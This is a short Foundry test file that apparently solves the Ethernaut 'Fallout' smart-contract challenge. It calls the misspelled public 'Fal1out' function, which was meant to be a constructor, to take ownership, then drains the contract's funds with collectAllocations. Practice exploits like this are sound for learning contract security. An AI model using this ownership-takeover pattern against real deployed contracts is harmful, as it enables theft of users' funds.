// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "lib/forge-std/src/Test.sol";
import {console} from "lib/forge-std/src/console.sol";
import {Fallout} from "../src/level-2_Fallout.sol";

contract FalloutExploit is Test
{
  Fallout fo;

  function setUp() public
  {
    fo = new Fallout(); 
  }

  function testExploit() public
  {
    address userAddr1 = makeAddr("userAddr1");
    vm.deal(userAddr1, 1 ether);
    vm.prank(userAddr1);
    fo.Fal1out{value : 0.1 ether}();

    vm.prank(userAddr1);
    fo.collectAllocations(); 
  }
}
